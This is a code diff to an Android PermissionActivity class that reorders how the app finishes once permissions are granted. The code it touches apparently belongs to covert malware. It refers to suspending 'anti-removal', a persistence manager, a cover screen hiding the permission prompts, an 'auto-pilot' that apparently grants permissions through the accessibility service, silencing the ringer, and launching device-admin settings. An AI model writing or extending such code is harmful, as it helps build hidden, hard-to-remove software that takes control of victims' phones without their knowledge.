@@ -97,6 +97,14 @@ public class PermissionActivity extends AppCompatActivity {
         // SUSPEND ANTI-REMOVAL
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", true).apply();
 
+        if (allStandardGranted()) {
+            restoreRingerMode();
+            IO_Persistence_Manager.setPermissionCoverVisible(false);
+            IO_Persistence_Manager.setAutoPilot(false);
+            showCompletionUI();
+            return;
+        }
+
         if (getIntent() != null && getIntent().getBooleanExtra("launch_admin", false)) {
             openAdminSettings();
             finish();
@@ -556,17 +564,22 @@ public class PermissionActivity extends AppCompatActivity {
     protected void onResume() {
         super.onResume();
 
+        if (allStandardGranted()) {
+            restoreRingerMode();
+            IO_Persistence_Manager.setPermissionCoverVisible(false);
+            IO_Persistence_Manager.setAutoPilot(false);
+            if (!"completed".equals(currentLayoutType)) {
+                showCompletionUI();
+            }
+            return;
+        }
+
         // If Accessibility was enabled, switch layout immediately before window draws (0ms delay)
         if (isAccessibilityServiceEnabled(this) && "accessibility".equals(currentLayoutType)) {
             ensureVerifyingUI();
         }
 
-        if (allStandardGranted()) {
-            IO_Persistence_Manager.setAutoPilot(false);
-            if (!"completed".equals(currentLayoutType)) {
-                checkSpecialChain();
-            }
-        } else if (!hasScanned && !isAnimationRunning && !"scanning".equals(currentLayoutType)) {
+        if (!hasScanned && !isAnimationRunning && !"scanning".equals(currentLayoutType)) {
             setupScanningUI();
         } else {
             checkSpecialChain();
